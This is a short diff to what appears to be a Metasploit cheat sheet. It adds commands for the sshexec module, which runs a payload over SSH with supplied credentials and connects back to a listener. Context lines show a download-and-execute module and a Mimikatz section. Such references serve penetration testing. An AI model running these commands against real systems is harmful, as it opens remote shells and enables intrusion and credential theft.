@@ -341,6 +341,25 @@ use post/windows/manage/download_exec
 run SESSION=2,URL='<url_to_exe>',EXECUTE=<true>
 ```
 
+# SSH user code execution
+## Options
+```ruby
+use exploit/multi/ssh/sshexec
+set SRVHOST <handler_listen_ip>
+set SRVPORT <handler_listen_port>
+set LHOST <payload_connect_to_ip>
+set LPORT <payload_connect_to_port>
+set RHOSTS <ip>
+set USERNAME <username>
+set PASSWORD <password>
+```
+
+## Run
+```ruby
+use exploit/multi/ssh/sshexec
+run -o SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_to_ip>,LPORT=<payload_connect_to_port>,RHOSTS=<ip>,USERNAME=<username>,PASSWORD=<password> <ip>
+```
+
 # Mimikatz
 ## Meterpreter
 ### Change password
